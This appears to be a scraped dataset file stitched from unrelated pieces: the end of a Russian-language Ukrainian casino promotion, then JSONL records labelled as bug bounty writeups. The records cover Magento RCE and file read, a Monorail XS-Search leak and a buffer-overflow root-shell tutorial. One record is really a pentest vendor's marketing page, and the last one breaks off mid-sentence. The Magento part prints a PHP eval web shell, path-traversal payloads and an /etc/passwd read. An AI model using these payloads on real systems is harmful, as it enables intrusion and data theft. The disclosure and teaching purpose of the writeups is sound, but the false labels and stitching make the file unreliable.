соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/", "title": "Magento – RCE & Local File Read with low privilege admin rights – SCRT Team Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.scrt.ch/2019/01/24/magento-rce-local-file-read-with-low-privilege-admin-rights/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMagento – RCE & Local File Read with low privilege admin rights – SCRT Team Blog Skip to content SCRT Team Blog Orange Cyberdefense Switzerland's technical blog Menu and widgets Categories Analytics (5) Antivirus (7) Events (54) Exploit (14) Forensics (7) Hardware (11) Insomni'hack (39) News (57) Pentest (11) Research (12) Vulnerability (35) Archives 2025 (4) 2024 (10) 2023 (10) 2022 (8) 2021 (6) 2020 (7) 2019 (3) 2018 (3) 2017 (11) 2016 (7) 2015 (12) 2014 (15) 2013 (28) 2012 (21) 2011 (15) 2010 (17) Magento – RCE & Local File Read with low privilege admin rights I regularly search for vulnerabilities on big services that allow it and have a Bug Bounty program. Here is a second paper which covers two vulnerabilities I discovered on Magento, a big ecommerce CMS that’s now part of Adobe Experience Cloud. These vulnerabilities have been responsibly disclosed to Magento team, and patched for Magento 2.3.0, 2.2.7 and 2.1.16. Both of vulnerabilities need low privileges admin account, usually given to Marketing users : The first vulnerability is a command execution using path traversal, and requires the user to be able to create products The second vulnerability is a local file read, and requires the user to be able to create email templates Here are the details ! Command Execution in Product Creation Magento has its own way to define the layout of a product, into the Design tab of the Product creation system. It’s format is XML-based and follows a syntax documented by Magento themselves. The full documentation is here : https://devdocs.magento.com/guides/v2.3/frontend-dev-guide/layouts/xml-instructions.html The interesting thing is the possibility to instantiate blocks with the <block> tag, and then to call methods on it with the <action> tag. This will only work if the object implements the Block interface, by the way. However, I was searching if there’s anything interesting to do with this, and saw the following function for class Magento\\Framework\\View\\Element\\Template : /** * Retrieve block view from file (template) * * @param string $fileName * @return string */ public function fetchView($fileName) { $relativeFilePath = $this->getRootDirectory()->getRelativePath($fileName); \\Magento\\Framework\\Profiler::start( 'TEMPLATE:' . $fileName, ['group' => 'TEMPLATE', 'file_name' => $relativeFilePath] ); if ($this->validator->isValid($fileName)) { $extension = pathinfo($fileName, PATHINFO_EXTENSION); $templateEngine = $this->templateEnginePool->get($extension); $html = $templateEngine->render($this->templateContext, $fileName, $this->_viewVars); } else { $html = ''; $templatePath = $fileName ?: $this->getTemplate(); $errorMessage = \"Invalid template file: '{$templatePath}' in module: '{$this->getModuleName()}'\" . \" block's name: '{$this->getNameInLayout()}'\"; if ($this->_appState->getMode() === \\Magento\\Framework\\App\\State::MODE_DEVELOPER) { throw new \\Magento\\Framework\\Exception\\ValidatorException( new \\Magento\\Framework\\Phrase( $errorMessage ) ); } $this->_logger->critical($errorMessage); } \\Magento\\Framework\\Profiler::stop('TEMPLATE:' . $fileName); return $html; } This code is responsible for loading templates from file; there’s two extension authorized that are phtml (to treat it as PHP template file) and xhtml (to treat it as plain HTML file I imagine?). Obviously, we want the PHP thing, that’s more fun. The $fileName parameter is passed into the \\Magento\\Framework\\View\\Element\\Template\\File\\Validator::isValid() function, that checks if the file is in certain directories (compiled, module or themes directories). This check used the isPathInDirectories to do so : protected function isPathInDirectories($path, $directories) { if (!is_array($directories)) { $directories = (array)$directories; } foreach ($directories as $directory) { if (0 === strpos($path, $directory)) { return true; } } return false; } This function only checks if the provided path begins by a specific directory name (ex: /path/to/your/magento/app/code/Magento/Theme/view/frontend/ ). However, it does not control that’s the resolved path is still in those whitelisted directories. That means there’s an obvious path traversal in this function that we can call through a Product Design. However, it will only process .phtml file as PHP code, which is a forbidden extension on most upload forms. “Most of upload forms” means there’s exception! You can create a file with “Custom Options”, and one is “File”. I imagine this is in case the customer wants to send a 3D template or instructions for its order. The real reason isn’t that important, the fact is that you can allow extensions you want to be uploaded, including phtml . Once the item is ordered, the uploaded file will be stored in /your/path/to/magento/pub/media/custom_options/quote/firstLetterOfYourOriginalFileName/secondLetterOfYourOriginalFileName/md5(contentOfYourFile).extension This is sufficient for having a command execution payload. Here is the complete steps : Log in with a user that has some low admin privileges and is allowed to create products First of all, create a new product, with a new Custom Options of type File , with .phtml as an authorized extension and some pieces in stock to order one. Go on the frontend, on the product you just created. Upload your .phtml and set the item in your cart. For example, my file is named “ blaklis.phtml ” and contains “ <?php eval(stripslashes($_REQUEST[0])); ?> “ The .phtml file is uploaded to /your/path/to/magento/pub/media/custom_options/quote/ firstLetterOfYourOriginalFileName / secondLetterOfYourOriginalFileName / md5(contentOfYourPhtmlFile) .phtml . For example, for my file, the location will be /your/path/to/magento/pub/media/custom_options/quote/b/l/11e48860e4cdacada256445285d56015.phtml You must have the full path to the application to use the fetchView function. An easy way to retrieve it is to run the following request : POST /magentoroot/index.php/magentoadmin/product_video/product_gallery/retrieveImage/key/[key]/?isAjax=true HTTP/1.1 [...] Connection: close remote_image=https://i.vimeocdn.com/video/41237643_640.jpg%00&form_key={{your_form_key}} This will make CURL crash and display an error with full path in it In the design tab of the product, add a 2 column layouts with the following XML in Layout Update XML : <referenceContainer name=\"sidebar.additional\"> <block class=\"Magento\\Backend\\Block\\Template\" name=\"test\"> <action method=\"fetchView\"> <argument name=\"fileName\" xsi:type=\"string\">/path/to/your/magento/app/code/Magento/Theme/view/frontend/../../../../../../pub/media/custom_options/quote/b/l/11e48860e4cdacada256445285d56015.phtml</argument> </action> </block> </referenceContainer> Go to the frontend page of this product; your code should executed. This flaw was not that obvious, but has been fun to search for! Local File Read in Email Templating This one is a lot easier; in fact, it was a pretty obvious one. Email templating allow to use some special directives, surrounded by {{ }} . One of these directives is {{css 'path'}} to load the content of a CSS file into the email. The path parameter is vulnerable to path traversal, and can be used to inject any file into the email template. The functions that are managing this directive are the following : public function cssDirective($construction) { if ($this->isPlainTemplateMode()) { return ''; } $params = $this->getParameters($construction[2]); $file = isset($params['file']) ? $params['file'] : null; if (!$file) { // Return CSS comment for debugging purposes return '/* ' . __('\"file\" parameter must be specified') . ' */'; } $css = $this->getCssProcessor()->process( $this->getCssFilesContent([$params['file']]) ); if (strpos($css, ContentProcessorInterface::ERROR_MESSAGE_PREFIX) !== false) { // Return compilation error wrapped in CSS comment return '/*' . PHP_EOL . $css . PHP_EOL . '*/'; } elseif (!empty($css)) { return $css; } else { // Return CSS comment for debugging purposes return '/* ' . sprintf(__('Contents of %s could not be loaded or is empty'), $file) . ' */'; } } public function getCssFilesContent(array $files) { // Remove duplicate files $files = array_unique($files); $designParams = $this->getDesignParams(); if (!count($designParams)) { throw new \\Magento\\Framework\\Exception\\MailException( __('Design params must be set before calling this method') ); } $css = ''; try { foreach ($files as $file) { $asset = $this->_assetRepo->createAsset($file, $designParams); $pubDirectory = $this->getPubDirectory($asset->getContext()->getBaseDirType()); if ($pubDirectory->isExist($asset->getPath())) { $css .= $pubDirectory->readFile($asset->getPath()); } else { $css .= $asset->getContent(); } } } catch (ContentProcessorException $exception) { $css = $exception->getMessage(); } catch (\\Magento\\Framework\\View\\Asset\\File\\NotFoundException $exception) { $css = ''; } return $css; } Those 2 functions are not checking for path traversal characters anywhere, and are indeed vulnerable. Creating an email template with the {{css file=\"../../../../../../../../../../../../../../../etc/passwd\"}} should be sufficient to trigger the vulnerability. Here is the responsible disclosure timeline for these 2 bugs : firstly, for the RCE one, and then for the file read one 2018.09.11 : initial disclosure for the path traversal / RCE 2018.09.17 : triaged by Bugcrowd staff 2018.10.08 : triaged by Magento staff 2018.11.28 : patch issued by Magento; release 2.2.7 and 2.1.16 released 2018.12.11 : a $5000 bounty was awarded 2018.08.09 : initial disclosure for the path traversal / local file read 2018.08.29 : triaged by Bugcrowd staff after asking for details 2018.10.08 : triaged by Magento staff 2018.11.28 : patch issued by Magento; release 2.2.7 and 2.1.16 released 2019.01.04 : a $2500 bounty was awarded Posted on January 24, 2019 January 12, 2023 Author blogscrt Categories Vulnerability Tags exploit , web Post navigation Previous Previous post: winhttpd writeup: private heaps pwning on Windows Next Next post: Public Intrusion Test of Swiss Postâs E-Voting System"}
{"source_url": "https://www.7elements.co.uk/resources/blog/facebooks-burglary-shopping-list/", "title": "Penetration Testing (Pen Test) Services | Redcentric", "friendly_explanation": "This is a bug bounty writeup from https://www.7elements.co.uk/resources/blog/facebooks-burglary-shopping-list/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPenetration Testing (Pen Test) Services | Redcentric Search for: 0800 983 2522 sayhello@redcentricplc.com Customer Support Client Log-In Contact Us Menu redcentric Your Challenges Organisational Agility Assured Availability Smarter Working IT Transformation Business Continuity Modern Workplace Our Solutions Communications Omnichannel Contact Centre IP Telephony Unified Communications Collaboration SIP Trunks Call Management and Reporting Call Recording Cloud Cloud Consultancy Cloud Migration IaaS AWS Microsoft Azure Hybrid Cloud Cloud Storage Modern Workplace 365 Virtual Desktops PaaS Networks Connectivity Managed WAN SD-WAN LAN Secure Remote Access Managed Wireless Networking Business Resilience Business Continuity Consultancy Data Backup Disaster Recovery Cyber Security Network Security Penetration Testing Services Application Security Access Management SIEM Endpoint Management DDoS Mitigation Vulnerability Management Security Monitoring & Analytics Professional Services IT Consultancy On-premises Hardware and Software Application Modernisation Implementation Services Supply Chain Management Maintenance & Support Public Sector Public Sector Sovereign Cloud HSCN Healthcare PSN Data Centres Customer Successes About Us Redcentric What’s New Blog News Events 4D Data Centres Accreditations Careers Leadership Team Customer Satisfaction Partners CSR Resources Our policies ESG Investors Board of Directors Corporate Governance Financial Reports RNS Announcements Financial Calendar Advisors Shareholder Information Constitutional Documents Shareholder Documents Customer Support Client Log-In Contact Us PENETRATION TESTING SERVICES Overcome your security weaknesses. We can help you to identify and fix vulnerabilities before they’re exploited. Schedule a call Get operational security with a pentest Fortify your organisation’s security infrastructure. By replicating real-world cyber-attacks within a controlled setting, penetration testing provides you with an inventory of your security vulnerabilities. Its aim is to enable proactive resolution of these weaknesses prior to potential exploitation by malicious actors. Our comprehensive assessments provide your organisation with peace of mind by identifying and addressing vulnerabilities. If you have regulatory standards or sensitive customer data, our service checks your network, system and application security to keep you safeguarded against potential cyber threats. Create assured environments for your organisation Our approach to security testing is based on manual penetration testing techniques and goes further than simple vulnerability scanning. Infrastructure testing Our infrastructure testing identifies weaknesses or vulnerabilities within the target network infrastructure and in components exposed to the internet. Application security testing Applications can quickly become vulnerable to new forms of attack. Our approach to application security testing blends the identification of technical exposure with business logic flaws that could lead to a breach in security. Mobile security testing From your corporate mobile devices and your mobile applications, we can help evaluate and understand your security issues so your data and systems are kept secure. Code review Reviewing code from a security perspective provides assurance that the application has been developed securely to defend against attacks. Network access review Stay protected against internet-based attacks. From firewall, wireless networks and on-site internet connected devices, we can help identify weaknesses that may lead to a compromise of the network. Social & phishing engagements Phishing is the art of enticing a victim to click on a malicious link and is a common component of our wider social engineering and scenario based (simulated attack) testing engagements. Get more than peace of mind with penetration testing Increased customer confidence Redcentric’s penetration testing services bolster your company’s reputation for robust security measures. By assuring potential clients of your commitment to data protection, you gain a competitive edge and enhance sales opportunities. Increased productivity By pre-emptively addressing security vulnerabilities, Redcentric’s service minimises disruptions caused by cyber incidents. This ensures uninterrupted business operations, thereby enhancing your overall productivity and efficiency. Streamlined compliance processes Our penetration testing service aids in meeting regulatory requirements seamlessly. By identifying and rectifying potential compliance gaps, you mitigate legal risks and avoid costly penalties, thus streamlining your compliance processes. We have found Redcentric to be an innovative penetration testing company. In order to meet our specific requirements, the team has delivered infrastructure and application security testing, as well as social engineering tests, using scenarios created by its highly skilled engineers. The features of our penetration testing capabilities Open-box and closed-box testing options External and internal penetration tests Tailored solutions for regulatory compliance Detailed reports with actionable insights Discuss your penetration testing requirements Take proactive steps to safeguard your business. Contact Redcentric today for expert penetration testing services tailored to your needs. Penetration Testing form \" * \" indicates required fields First Name * Last Name * Email * Telephone * Company * Message Privacy consent * Tick this box if you agree to be contacted in accordance with our privacy policy. Name This field is for validation purposes and should be left unchanged. From Pentesting to strategy: an important first step Learn how Pentesting fits into a broader security strategy, why choosing the right partner matters, and how accreditation helps you prove your commitment to protecting your organisation. Proving you’re secure: the role of Pentesting Discover how Pentesting helps prove your organisation is secure, why it’s essential for managing real-world risks, and how a tailored approach strengthens your overall InfoSec strategy. Penetration Testing: 7 things to test to identify your cyber security risks This blog discusses seven critical areas to consider within a tailored penetration testing programme. × Speak to our team Penetration Testing form \" * \" indicates required fields First Name * Last Name * Email * Telephone * Company * Message Privacy consent * Tick this box if you agree to be contacted in accordance with our privacy policy. Comments This field is for validation purposes and should be left unchanged. Our Solutions Networks Cloud Communications Cyber Security Professional Services Business resilience Communications IP Telephony Unified Communications SIP Trunks Collaboration Call Recording Cloud Colocation IaaS AWS Microsoft Azure Hybrid Cloud Cloud Migration Networks Connectivity SD-WAN LAN Managed WAN Secure Remote Access Managed Wireless Networking Our UK Data Centres London City Data Centre West Yorkshire Data Centre London West Data Centre Accreditations About Us Modern Slavery Statement Contact us Sales: 0800 983 2522 sayhello@redcentricplc.com Support: 0345 120 7070 All communications to or from Redcentric may be recorded for training and quality purposes © Copyright 2025 Redcentric plc. All rights reserved | Privacy and Cookie Policy | Modern Slavery Statement Redcentric plc. Registered in England and Wales with company number: 08397584. Registered address: Central House, Beckwith Knowle, Harrogate, HG3 1UG. Redcentric Solutions Ltd, trading as Redcentric. Registered in England and Wales with company number: 08322856. Registered address: Central House, Beckwith Knowle, Harrogate, HG3 1UG. redcentric Redcentric Your Challenges Organisational Agility Assured Availability Smarter Working IT Transformation Business Continuity Modern Workplace Back Our Solutions Communications Omnichannel Contact Centre IP Telephony Unified Communications Collaboration SIP Trunks Call Management and Reporting Call Recording Back Cloud Cloud Consultancy Cloud Migration IaaS AWS Microsoft Azure Hybrid Cloud Cloud Storage Modern Workplace 365 Virtual Desktops PaaS Back Networks Connectivity Managed WAN SD-WAN LAN Secure Remote Access Managed Wireless Networking Back Business Resilience Business Continuity Consultancy Data Backup Disaster Recovery Back Cyber Security Network Security Penetration Testing Services Application Security Access Management SIEM Endpoint Management DDoS Mitigation Vulnerability Management Security Monitoring & Analytics Back Professional Services IT Consultancy On-premises Hardware and Software Application Modernisation Implementation Services Supply Chain Management Maintenance & Support Back Back Public Sector Public Sector Sovereign Cloud HSCN Healthcare PSN Back Data Centres Customer Successes About Us Redcentric What’s New Blog News Events Back 4D Data Centres Accreditations Careers Leadership Team Customer Satisfaction Partners CSR Resources Our policies ESG Back Investors Board of Directors Corporate Governance Financial Reports RNS Announcements Financial Calendar Advisors Shareholder Information Constitutional Documents Shareholder Documents Back Customer Support Client Log-In Contact Us 0800 983 2522 sayhello@redcentricplc.com"}
{"source_url": "https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549", "title": "XS-Searching Google’s bug tracker to find out vulnerable source code | by Luan Herrera | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@luanherrera/xs-searching-googles-bug-tracker-to-find-out-vulnerable-source-code-50d8135b7549. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXS-Searching Google’s bug tracker to find out vulnerable source code | by Luan Herrera | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XS-Searching Google’s bug tracker to find out vulnerable source code Or how side-channel timing attacks aren’t that impractical Luan Herrera 6 min read · Nov 19, 2018 -- 1 Listen Share Monorail is an open-source issue tracker used by many “Chromium-orbiting” projects, including Monorail itself. Other projects include Angle, PDFium, Gerrit, V8, and the Alliance for Open Media. It is also used by Project Zero, Google’s 0-day bug-finding team. This article is a detailed explanation of how I could have exploited Google’s Monorail issue tracker to leak sensitive information (vulnerable source code files and line numbers) from private bug reports through a XS-Search attack. Where to start? One of the first functionalities I looked into when analyzing Monorail was the ability to download the result of a certain search query as a CSV. It didn’t take me long to notice that it was vulnerable to a CSRF attack. In other words, it was possible to force an user to download a CSV containing the results of a search query if a malicious link was accessed. Press enter or click to view image in full size https://bugs.chromium.org/p/chromium/issues/csv?can=1&q=Restrict=View-SecurityTeam&colspec=ID As seen in the image, there were no protections against CSRF attacks. So, for example, a request made with the “Restrict-View-SecurityTeam” tag would end up filtering the results to undisclosed security-related issues only. If a member of the Google security team or a high profile bug reporter were to access this link, they would download a CSV containing all undisclosed issues they have access to. Duplicate and conquer Another important discovery was that columns displayed in a search result could be duplicated, allowing us to arbitrarily increase the length of the generated CSV. To illustrate, if we were to access the URL below: https://bugs.chromium.org/p/chromium/issues/csv?can=1&q=id:51337&colspec=ID+ Summary + Summary + Summary The downloaded CSV would contain 3 repeated Summary columns, instead of only one. Press enter or click to view image in full size CSV generated from a query containing the “Summary” column 3 times. Come again? A XS-Search attack? Combining these two vulnerabilities we have all that is needed to perform a Cross-Site Search (XS-Search) attack: Capacity to perform complex search queries. Capacity to inflate the response of a search query. The second point is particularly important. If the response of a search query matches a bug, we can make the CSV significantly bigger than a query that doesn’t. Because of this big difference in response length, it’s possible to calculate the time each request takes to complete and then infer whether the query returned results or not. This way, we achieve the ability to ask cross-origin boolean questions. The phrase “cross-origin boolean questions” sounds weird, but it essentially means we’re able to ask questions like “is there any private bug that matches the folder `src/third_party/pdfium/`?” and obtain the answer cross-origin. This involves several steps that will be described in the following section. For now, the examples below demonstrate the core of the issue: Press enter or click to view image in full size 1st case — CSV generated from query “Summary: This bug exists”. Press enter or click to view image in full size 2nd case — CSV generated from query “Summary: This bug doesn’t exist”. Press enter or click to view image in full size 3rd case — CSV generated from query ”Summary: This bug exists OR Summary: This bug doesn’t exist“. As we can see, on the first and third case we would have an arbitrarily big CSV, because both queries match a bug with summary “This bug exists”. On the second case, the CSV would be empty (containing only the header), because the query didn’t match any bug with the Summary “This bug doesn’t exist”. Note that in the third case we are using the logic operator OR to query the first and second cases together. To ask or not to ask? One of the problems I had when trying to create a PoC was deciding what to search. Monorail’s search doesn’t allow us to query for specific letters in a report, only words. This meant that we couldn’t bruteforce the report char by char. After realizing this, I had to take a step back and search older bug reports looking for information that was relevant and could realistically be exfiltrated by the attack. That’s when I learned that many Chromium bug reports indicate the file path and line number where the vulnerability can be found. Press enter or click to view image in full size Example from https://bugs.chromium.org/p/chromium/issues/detail?id=770148 That’s perfect for a XS-Search attack: since the folder structure of Chromium is public and Monorail treats slashes as words delimiters (a query for “path/to/dir” also includes results for bugs containing the string “path/to/dir/sub/dir”), we can easily generate the appropriate search queries. So our attack would look something like this: We find out if there’s any private bug report that mentions a file in Chromium’s source tree. We do this using https://cs.chromium.org/chromium/src / as the base query. We search for the first half of all the directories under src/ using the OR operator (e.g. src/blink OR src/build… ). We keep repeating step 2 using the binary search algorithm. If anything was found (i.e. a big CSV was generated), we restrict the search space to the first half. Otherwise (i.e., an empty CSV was generated), we restrict the search space to the second half. After eliminating all directories but one, we restart step 2, but now adding the newly found directory to the end of the base query. At the end of this process, the full URL will have been leaked and we can now (as an attacker) look into the corresponding file and try to find the vulnerability that was reported. One request to rule them all You might be wondering how we obtained the size of the CSV in step 3. Since the Same-Origin policy forbids us from accessing information across different origins, a naive response.length won’t work. While we can’t know for sure the exact size of a response, we can measure the time each request takes to complete. Using the response-length inflation technique covered in previous sections, searches returning a bug would be a lot slower to finish than ones that do not. However, to achieve a high degree of certainty, simply doing one request isn’t enough. We would need to request the same page many times and measure the average response time to obtain a reliable exploit. That’s when the Cache API comes in handy, by only making one request and repeatedly calculating the duration that the response takes to be cached it’s possible to infer, with certainty, if the result of the search query returned bugs or not. In other words, a small response takes less time to be cached than a bigger response. Given there are almost no limitations to the Cache API (and it being extremely fast), we can cache and measure the same response several times, and then compare it with the measurements of a known empty search query result, which allows us to easily differentiate a large response from a small/empty one, filtering out hardware and network variances, increasing the exploit’s speed and reliability. For more information on how this can be implemented you can check the exploit’s code . Aftermath In total, I found three different places where this attack could be carried on, which resulted in CVE-2018–10099, CVE-2018–19334 and CVE-2018–19335. I was also rewarded $3133,7 for each vulnerability, totaling over $9400. Contact If you have any questions, caught some typo or something that I missed, feel free to contact me on @lbherrera_ References [1] Commit fixing the CSRF in Monorail’s CSV file download ( https://chromium.googlesource.com/infra/infra/+/bdb78934b151ac75bf41711797bbf81130c5a502 ). [2] Commit fixing the duplicated columns bug ( https://chromium.googlesource.com/infra/infra/+/0ff6b6453b6192987bd9240c1e872a7de5fb1313 ). [3] Commit disallowing double grid axes and Cc axis ( https://chromium.googlesource.com/infra/infra/+/77ef00cb53d90c9d1f984eca434d828de5c167a5 ). [4] Commit preventing request inflation through the groupby parameter ( https://chromium.googlesource.com/infra/infra/+/e27936ef82d33a5f286e1f2f22817aa682f79e90 ). -- -- 1 Written by Luan Herrera 425 followers · 27 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://github.com/npapernot/buffer-overflow-attack", "title": "GitHub - npapernot/buffer-overflow-attack: This is an example buffer overflow attack on a small vulnerable C program.", "friendly_explanation": "This is a bug bounty writeup from https://github.com/npapernot/buffer-overflow-attack. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - npapernot/buffer-overflow-attack: This is an example buffer overflow attack on a small vulnerable C program. Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert npapernot / buffer-overflow-attack Public Notifications You must be signed in to change notification settings Fork 51 Star 80 This is an example buffer overflow attack on a small vulnerable C program. 80 stars 51 forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 0 Pull requests 0 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights npapernot/buffer-overflow-attack master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 4 Commits README.md README.md call_shellcode.c call_shellcode.c exploit.c exploit.c set_uid_root.c set_uid_root.c stack.c stack.c View all files Repository files navigation README Buffer Overflow Vulnerability This is a short tutorial on running a simple buffer overflow on a virtual machine running Ubuntu. It shows how one can use a buffer overflow to obtain a root shell. The end of the tutorial also demonstrates how two defenses in the Ubuntu OS prevent the simple buffer overflow attack implemented here. This tutorial leverages the paper written by alephOne on buffer overflows: http://cecs.wright.edu/~tkprasad/courses/cs781/alephOne.html Initial Setup of the Virtual Machine Let us first go through the initial setup of the virtual machine used to experiment with buffer overflow. The virtual machine used runs Ubuntu OS 12.04 LTS . To make our attack easier, we first need to disable address space randomization, a defense against buffer overflows making guessing addrsses in the heap and stack more difficult. To do so, we simply need to run the following command under root privileges: su root sysctl -w kernel.randomize_va_space=0 A confirmation of the variable's value is printed kernel.randomize_va_space = 0 by the terminal. Example of a Shellcode The file call_shellcode.c containes an example shellcode, which allows one to store a char in a buffer and then call the shell by a buffer overflow. To run the shell, we can compile call_shellcode.c using the executable stack option in gcc . Running the program ./call_shellcode from the terminal starts a shell, which can for instance be used to run programs (e.g., vim ). This shellcode was however not injected so this example does not really correspond to a realistic threat model. Instead, we now show how one can inject the buffer using a file loaded by a vulnerable program. Vulnerable Program The vulnerable program is provided in the stack.c file. It needs to be made a set-root-uid in order for the adversary exploiting the buffer overflow to be able to gain access to a root shell. For that purpose, we compile the file using root privileges. Furthermore, if GCC>4.3.3 is used, since the Stack Guard option is enabled by default, one needs to disable it at compile time (cf. below). Note that we also use the executable stack option (to be able to run our shellcode from the buffer). Finally, to make the file executable, we chmod the permissions to 4755 on the compiled program stack . su root gcc -o stack -z execstack -fno-stack-protector stack.c chmod 4755 stack Exploiting the Vulnerability: Demonstration of the Buffer Overflow Attack We now need to craft the badfile file that will be read by this vulnerable program 'stack' and stored in the buffer, which will be overflowed. The file exploit.c contains code that dumps the buffer that will be read by the vulnerable program. The code is well commented and should be fairly understandable and leverages sample code provided in the paper by alephOne. To demonstrate the buffer flow attack, we run the following commands: gcc -o exploit exploit.c ./exploit ./stack This simply compiles and runs the exploit file. The exploit file evaluates the stack pointer and crafts a buffer (with the stack pointer and the shellcode) and saves it to badfile . The vulnerable program stack is then executed, it reads the file badfile and loads the buffer, which triggers the buffer overflow and executes the shellcode, thus giving us a root shell (designated by # ). Note that the root shell we have obtained is still using our user ID, as proved by running the id command. To solve this and have both the real and effective user ids set to root, one can run the included set_uid_root.c file. Address Randomization: a first defense One can set 